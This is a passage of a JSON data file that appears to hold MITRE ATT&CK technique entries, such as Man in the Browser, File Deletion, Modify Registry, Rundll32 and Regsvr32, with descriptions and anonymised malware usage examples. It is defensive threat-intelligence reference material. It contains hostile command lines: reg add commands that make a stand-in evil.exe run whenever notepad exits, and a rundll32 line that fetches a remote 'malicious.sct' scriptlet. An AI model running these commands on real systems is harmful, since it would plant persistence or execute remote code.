    "description": "Adversaries can take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify behavior, and intercept information as part of various man in the browser techniques. (Citation: Wikipedia Man in the Browser)\n\nA specific example is when an adversary injects software into a browser that allows an them to inherit cookies, HTTP sessions, and SSL client certificates of a user and use the browser as a way to pivot into an authenticated intranet. (Citation: Cobalt Strike Browser Pivot) (Citation: ICEBRG Chrome Extensions)\n\nBrowser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. Browser traffic is pivoted from the adversary's browser through the user's browser by setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not alter the user's traffic in any way. The proxy connection is severed as soon as the browser is closed. Whichever browser process the proxy is injected into, the adversary assumes the security context of that process. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could browse to any resource on an intranet that is accessible through the browser and which the browser has sufficient permissions, such as Sharepoint or webmail. Browser pivoting also eliminates the security provided by 2-factor authentication. (Citation: cobaltstrike manual)",
    "example_uses": [
      "uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified web page.",
      "can perform browser pivoting and inject into a user's browser to inherit cookies, authenticated HTTP sessions, and client SSL certificates."
    ],
    "id": "T1185",
    "name": "Man in the Browser",
    "similar_words": [
      "Man in the Browser"
    ]
  },
  "attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba": {
    "description": "An adversary may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.",
    "example_uses": [
      "uses VNC to connect into systems.",
      "can SSH to a remote service.",
      "has used Putty to access compromised systems.",
      "has used Putty Secure Copy Client (PSCP) to transfer data.",
      "uses Putty and VNC for lateral movement."
    ],
    "id": "T1021",
    "name": "Remote Services",
    "similar_words": [
      "Remote Services"
    ]
  },
  "attack-pattern--564998d8-ab3e-4123-93fb-eccaa6b9714a": {
    "description": "DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a Domain Controller (DC). (Citation: DCShadow Blog) (Citation: BlueHat DCShadow Jan 2018) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1178) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog) (Citation: BlueHat DCShadow Jan 2018)",
    "example_uses": [
      "’s LSADUMP::DCShadow module can be used to make AD updates by temporarily setting a computer to be a DC."
    ],
    "id": "T1207",
    "name": "DCShadow",
    "similar_words": [
      "DCShadow"
    ]
  },
  "attack-pattern--56fca983-1cf1-4fd1-bda0-5e170a37ab59": {
    "description": "Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)",
    "example_uses": [
      "deleted the DLL dropper from the victim’s machine to cover their tracks.",
      "deletes the .LNK file from the startup directory as well as the dropper components.",
      "can wipe files indicated by the attacker and remove itself from disk using a batch file.",
      "deletes files using DeleteFileW API call.",
      "can delete files and itself after infection to avoid analysis.",
      "removes batch files to reduce fingerprint on the system as well as deletes the CAB file that gets encoded upon infection.",
      "has the capability to use rm -rf to remove folders and files from the victim's machine.",
      "deletes any temporary files it creates",
      "has a command to delete files.",
      "removed certain files and replaced them so they could not be retrieved.",
      "will delete files on the system.",
      "can remove itself from a system.",
      "can delete files on the victim’s machine.",
      "contains code to delete files from the victim’s machine.",
      "deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.",
      "has the capability to delete files and scripts from the victim's machine.",
      "deletes its dropper and VBS scripts from the victim’s machine.",
      "has the capability to delete files off the victim’s machine.",
      "removes all files in the /tmp directory.",
      "has a command to delete its Registry key and scheduled task.",
      "can delete files off the system.",
      "has a command to delete a file and deletes files after they have been successfully uploaded to C2 servers.",
      "launches a script to delete their original decoy file to cover tracks.",
      "deletes one of its files, 2.hwp, from the endpoint after establishing persistence.",
      "has a command to delete files.",
      "A  macro deletes files after it has decoded and decompressed them.",
      "has a function to delete files from the victim’s machine.",
      "marks files to be deleted upon the next system reboot and uninstalls and removes itself from the system.",
      "can delete files and optionally overwrite with random data beforehand.",
      "has deleted tmp and prefetch files during post compromise cleanup activities.",
      "creates a backdoor through which remote attackers can delete files.",
      "has access to destructive malware that is capable of overwriting a machine's Master Boot Record (MBR).",
      "installer/uninstaller component deletes itself if it encounters a version of Windows earlier than Windows XP or identifies security-related processes running.",
      "has the capability to delete local files.",
      "can wipe drives using  Remove-Item commands.",
      "creates a backdoor through which remote attackers can delete files.",
      "creates a backdoor through which remote attackers can delete files.",
      "can delete files written to disk.",
      "deletes data in a way that makes it unrecoverable.",
      "deletes the original dropped file from the victim.",
      "has deleted and overwrote files to cover tracks.",
      "creates then deletes log files during installation of itself as a service.",
      "has a tool that can delete files.",
      "uses  to clean up the environment and attempt to prevent detection.",
      "can delete malware and associated artifacts from the victim.",
      "has commands to delete files and persistence mechanisms from the victim.",
      "The  uploader or malware the uploader uses command to delete the RAR archives after they have been exfiltrated.",
      "has deleted files associated with their payload after execution.",
      "deletes its payload along with the payload's parent process after it finishes copying files.",
      "has used batch scripts and scheduled tasks to delete critical system files.",
      "has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.",
      "can delete a specified file.",
      "The  dropper can delete itself from the victim. Another  variant has the capability to delete specified files.",
      "is capable of deleting the backdoor file.",
      "Some  samples use cmd.exe to delete temporary files.",
      "has deleted existing logs and exfiltrated file archives from a victim.",
      "2 contains a \"Destroy\" plug-in that destroys data stored on victim hard drives by overwriting file contents.",
      "Recent versions of  delete files and registry keys created by the malware.",
      "has the capability to delete files.",
      "is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.",
      "can delete specified files.",
      "can delete files and directories.",
      "deletes its original installer file once installation is complete.",
      "can delete files and directories.",
      "contains a cleanup module that removes traces of itself from the victim.",
      "The  trojan supports file deletion.",
      "contains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method.",
      "can delete itself or specified files.",
      "deletes its RAT installer file as it executes its DLL payload file.",
      "is capable of deleting files on the victim. It also securely removes itself after collecting and exfiltrating data.",
      "deletes content from C2 communications that was saved to the user's temporary directory.",
      "can be used to delete files from the file system.",
      "has a command to write random data across a file and delete it.",
      "is capable of file deletion along with other file system interaction.",
      "RAT is able to delete files.",
      "attempts to overwrite operating system files with image files.",
      "has several commands to delete files associated with the malware from the victim.",
      "can delete files that may interfere with it executing. It also can delete temporary files and itself after the initial script executes.",
      "can delete all files created during its execution.",
      "can securely delete files, including deleting itself from the victim.",
      "deletes shadow copies from the victim.",
      "Malware used by  is capable of remotely deleting files from victims.",
      "malware deletes files in various ways, including \"suicide scripts\" to delete malware binaries from the victim.  also uses secure file deletion to delete files from the victim. Additionally,  malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine.",
      "actors deleted tools and batch files from victim systems."
    ],
    "id": "T1107",
    "name": "File Deletion",
    "similar_words": [
      "File Deletion"
    ]
  },
  "attack-pattern--56ff457d-5e39-492b-974c-dfd2b8603ffe": {
    "description": "Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. (Citation: Wikipedia Public Key Crypto)\n\nAdversaries may gather private keys from compromised systems for use in authenticating to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as ~/.ssh for SSH keys on * nix-based systems or C:\\Users\\(username)\\.ssh\\ on Windows.\n\nPrivate keys should require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line.\n\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates. (Citation: Kaspersky Careto) (Citation: Palo Alto Prince of Persia)",
    "example_uses": [
      "CRYPTO::Extract module can extract keys by interacting with Windows cryptographic application programming interface (API) functions."
    ],
    "id": "T1145",
    "name": "Private Keys",
    "similar_words": [
      "Private Keys"
    ]
  },
  "attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4": {
    "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in Persistence and Execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API (see examples).\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reg)hide NOV 2006 Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to establish Persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of Lateral Movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) for RPC communication.",
    "example_uses": [
      "uses a Port 22 malware variant to modify several Registry keys.",
      "can install encrypted configuration data under the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dll and HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs.",
      "has a command to edit the Registry on the victim’s machine.",
      "A  payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.",
      "modified the Registry to perform multiple techniques through the use of .",
      "A  tool can create a new Registry key under HKEY_CURRENT_USER\\Software\\Classes\\.",
      "has a command to create Registry entries for storing data under HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WABE\\DataPath.",
      "creates three Registry keys to establish persistence by adding a .",
      "uses a batch file that modifies Registry keys to launch a DLL into the svchost.exe process.",
      "stores configuration values under the Registry key HKCU\\Software\\Microsoft\\[dllname] and modifies Registry keys under HKCR\\CLSID\\...\\InprocServer32with a path to the launcher.",
      "has a command to create, set, copy, or delete a specified Registry key or value.",
      "deletes the Registry key HKCU\\Software\\Classes\\Applications\\rundll32.exe\\shell\\open.",
      "uses reg add to add a Registry Run key for persistence.",
      "modifies the firewall Registry key SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfileGloballyOpenPorts\\\\List.",
      "modifies an HKCU Registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications.",
      "creates a Registry subkey that registers a new system device.",
      "can manipulate Registry keys.",
      "stores the encoded configuration file in the Registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentContorlSet\\Control\\WMI\\Security.",
      "malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under HKCU\\Software\\Microsoft\\Office\\.",
      "writes data into the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Pniumj.",
      "has deleted Registry keys during post compromise cleanup activities.",
      "creates a Registry subkey that registers a new service.",
      "creates Registry entries that store information about a created service and point to a malicious DLL dropped to disk.",
      "creates a Registry subkey to register its created service, and can also uninstall itself later by deleting this value. 's backdoor also enables remote attackers to modify and delete subkeys.",
      "may be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface.",
      "Once  has access to a network share, it enables the RemoteRegistry service on the target system. It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy to 1.",
      "can delete all Registry entries created during its execution.",
      "has the ability to modify the Registry.",
      "is capable of setting and deleting Registry values.",
      "may store RC4 encrypted configuration information in the Windows Registry.",
      "is capable of deleting Registry keys, sub-keys, and values on a victim system.",
      "appears to have functionality to modify remote Registry information.",
      "is capable of modifying the Registry.",
      "is capable of manipulating the Registry.",
      "has functionality to remove Registry Run key persistence as a cleanup procedure."
    ],
    "id": "T1112",
    "name": "Modify Registry",
    "similar_words": [
      "Modify Registry"
    ]
  },
  "attack-pattern--5ad95aaa-49c1-4784-821d-2e83f47b079b": {
    "description": "macOS and OS X applications send AppleEvent messages to each other for interprocess communications (IPC). These messages can be easily scripted with AppleScript for local or remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the osalang program.\nAppleEvent messages can be sent independently or as part of a script. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. \n\nAdversaries can use this to interact with open SSH connection, move to remote machines, and even present users with fake dialog boxes. These events cannot start applications remotely (they can start them locally though), but can interact with applications if they're already running remotely. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via python  (Citation: Macro Malware Targets Macs). Scripts can be run from the command-line via osascript /path/to/script or osascript -e \"script here\".",
    "example_uses": [
      "uses AppleScript to create a login item for persistence."
    ],
    "id": "T1155",
    "name": "AppleScript",
    "similar_words": [
      "AppleScript"
    ]
  },
  "attack-pattern--5e4a2073-9643-44cb-a0b5-e7f4048446c7": {
    "description": "Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.\n\nBrowser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials in Files](https://attack.mitre.org/techniques/T1081) associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.",
    "example_uses": [
      "collects information on bookmarks from Google Chrome.",
      "has a command to upload to its C2 server victim browser bookmarks."
    ],
    "id": "T1217",
    "name": "Browser Bookmark Discovery",
    "similar_words": [
      "Browser Bookmark Discovery"
    ]
  },
  "attack-pattern--62166220-e498-410f-a90a-19d4339d4e99": {
    "description": "Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\\dbg\\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as Debugger values in the Registry under HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable> where <executable> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)\n\nAn example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar Moe IFEO APR 2018)\n\n* reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512\n* reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1\n* reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d \"C:\\temp\\evil.exe\"\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.\n\nMalware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)",
    "example_uses": [],
    "id": "T1183",
    "name": "Image File Execution Options Injection",
    "similar_words": [
      "Image File Execution Options Injection"
    ]
  },
  "attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5": {
    "description": "The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)",
    "example_uses": [
      "configured its payload to inject into the rundll32.exe.",
      "uses rundll32.exe to execute as part of the Registry Run key it adds: HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\”vert” = “rundll32.exe c:\\windows\\temp\\pvcu.dll , Qszdez”.",
      "uses Rundll32 to load a malicious DLL.",
      "uses Rundll32 to ensure only a single instance of itself is running at once.",
      "uses Rundll32 for executing the dropper program.",
      "can use Rundll32 to execute additional payloads.",
      "uses rundll32.exe in a Registry value added to establish persistence.",
      "launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.",
      "A  variant has used rundll32 for execution.",
      "uses rundll32 within  entries to execute malicious DLLs.",
      "can load a DLL using .",
      "has a tool that can run DLLs.",
      "uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.",
      "uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.",
      "Rundll32.exe is used as a way of executing  at the command-line.",
      "uses rundll32 to call an exported function.",
      "executes functions using rundll32.exe.",
      "uses rundll32.exe to load.",
      "Variants of  have used rundll32.exe in Registry values added to establish persistence.",
      "After copying itself to a DLL file, a variant of  calls the DLL file using rundll32.exe.",
      "The  dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main  component.",
      "uses rundll32.exe to load its DLL.",
      "calls cmd.exe to run various DLL files via rundll32.",
      "is executed using rundll32.exe.",
      "has used rundll32.exe in a Registry value to establish persistence.",
      "runs its core DLL file using rundll32.exe.",
      "is installed via execution of rundll32 with an export named \"init\" or \"InitW.\"",
      "The  installer loads a DLL using rundll32.",
      "installs VNC server software that executes through rundll32.",
      "executed  by using rundll32 commands such as rundll32.exe “C:\\Windows\\twain_64.dll”.  also executed a .dll for a first stage dropper using rundll32.exe. An  loader Trojan saved a batch script that uses rundll32 to execute a DLL payload."
    ],
    "id": "T1085",
    "name": "Rundll32",
    "similar_words": [
      "Rundll32"
    ]
  },
  "attack-pattern--62dfd1ca-52d5-483c-a84b-d6e80bf94b7b": {
    "description": "Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Registry. Service configurations can be modified using utilities such as sc.exe and [Reg](https://attack.mitre.org/software/S0075).\n\nAdversaries can modify an existing service to persist malware on a system by using system utilities or by using custom tools to interact with the Windows API. Use of existing services is a type of [Masquerading](https://attack.mitre.org/techniques/T1036) that may make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.\n\nAdversaries may also intentionally corrupt or kill services to execute malicious recovery programs/commands. (Citation: Twitter Service Recovery Nov 2017) (Citation: Microsoft Service Recovery Feb 2013)",
    "example_uses": [
      "An  Port 22 malware variant registers itself as a service.",
      "can terminate a specific process by its process id.",
      "has batch files that modify the system service COMSysApp to load a malicious DLL.",
      "creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.",
      "can delete services from the victim’s machine.",
      "contains a collection of Privesc-PowerUp modules that can discover and replace/modify service binaries, paths, and configs.",
      "installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry.",
      "can modify service configurations."
    ],
    "id": "T1031",
    "name": "Modify Existing Service",
    "similar_words": [
      "Modify Existing Service"
    ]
  },
  "attack-pattern--64196062-5210-42c3-9a02-563a0d1797ef": {
    "description": "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",
    "example_uses": [
      "Part of 's operation involved using  modules to copy itself to air-gapped machines, using files written to USB sticks to transfer data and command traffic.",
      "drops commands for a second victim onto a removable media drive inserted into the first victim, and commands are executed when the drive is inserted into the second victim.",
      "uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted."
    ],
    "id": "T1092",
    "name": "Communication Through Removable Media",
    "similar_words": [
      "Communication Through Removable Media"
    ]
  },
  "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196": {
    "description": "File permissions are commonly managed by discretionary access control lists (DACLs) specified by the file owner. File DACL implementation may vary by platform, but generally explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.). (Citation: Microsoft DACL May 2018) (Citation: Microsoft File Rights May 2018) (Citation: Unix File Permissions)\n\nAdversaries may modify file permissions/attributes to evade intended DACLs. (Citation: Hybrid Analysis Icacls1 June 2018) (Citation: Hybrid Analysis Icacls2 May 2018) Modifications may include changing specific access rights, which may require taking ownership of a file and/or elevated permissions such as Administrator/root depending on the file's existing permissions to enable malicious activity such as modifying, replacing, or deleting specific files. Specific file modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1015), [Logon Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files.",
    "example_uses": [
      "can use the command-line utility cacls.exe to change file permissions."
    ],
    "id": "T1222",
    "name": "File Permissions Modification",
    "similar_words": [
      "File Permissions Modification"
    ]
  },
  "attack-pattern--66f73398-8394-4711-85e5-34c8540b22a5": {
    "description": "Windows processes often leverage application programming interface (API) functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. (Citation: Microsoft Hook Overview) (Citation: Endgame Process Injection July 2017)\n* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored. (Citation: Endgame Process Injection July 2017) (Citation: Adlice Software IAT Hooks Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow. (Citation: Endgame Process Injection July 2017) (Citation: HighTech Bridge Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal use.\n\nMalicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for Credential Access. (Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017)\n\nHooking is commonly utilized by [Rootkit](https://attack.mitre.org/techniques/T1014)s to conceal files, processes, Registry keys, and other objects in order to hide malware and associated behaviors. (Citation: Symantec Windows Rootkits)",
    "example_uses": [
      "is capable of using Windows hook interfaces for information gathering such as credential access.",
      "hooks processes by modifying IAT pointers to CreateWindowEx."
    ],
    "id": "T1179",
    "name": "Hooking",
    "similar_words": [
      "Hooking"
    ]
  },
  "attack-pattern--6856ddd6-2df3-4379-8b87-284603c189c3": {
    "description": "The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
    "example_uses": [
      "is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.",
      "performs BIOS modification and can download and execute a file as well as protect itself from removal."
    ],
    "id": "T1019",
    "name": "System Firmware",
    "similar_words": [
      "System Firmware"
    ]
  },
  "attack-pattern--68c96494-1a50-403e-8844-69a6af278c68": {
    "description": "When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access (Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under HKEY_CLASSES_ROOT\\.[extension], for example HKEY_CLASSES_ROOT\\.txt. The entries point to a handler for that extension located at HKEY_CLASSES_ROOT\\[handler]. The various commands are then listed as subkeys underneath the shell key at HKEY_CLASSES_ROOT\\[handler]\\shell\\[action]\\command. For example:\n* HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command\n* HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command\n* HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012)",
    "example_uses": [],
    "id": "T1042",
    "name": "Change Default File Association",
    "similar_words": [
      "Change Default File Association"
    ]
  },
  "attack-pattern--68f7e3a1-f09f-4164-9a62-16b648a0dd5a": {
    "description": "Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)\n\nAdversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.\n\nRegsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: SubTee Regsvr32 Whitelisting Bypass) This variation of the technique is often referred to as a \"Squiblydoo\" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016)",
    "example_uses": [
      "used regsvr32.exe to execute scripts.",
      "can use Regsvr32 to execute additional payloads.",
      "used Regsvr32 to bypass application whitelisting techniques.",
      "has used regsvr32 for execution.",
      "Some  versions have an embedded DLL known as MockDll that uses  and regsvr32 to execute another payload.",
      "created a  that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory.",
      "executes using regsvr32.exe called from the  persistence mechanism.",
      "variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.",
      "has used regsvr32.exe to execute a server variant of  in victim networks."
    ],
    "id": "T1117",
    "name": "Regsvr32",
    "similar_words": [
      "Regsvr32"
    ]
  },
  "attack-pattern--6a3be63a-64c5-4678-a036-03ff8fc35300": {
    "description": "Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user reboots their machine. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at ~/Library/Preferences/com.apple.loginwindow.plist and ~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist. \n\nAn adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine (Citation: Methods of Mac Malware Persistence).",
    "example_uses": [],
    "id": "T1164",
    "name": "Re-opened Applications",
    "similar_words": [
      "Re-opened Applications"
    ]
  },
  "attack-pattern--6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df": {
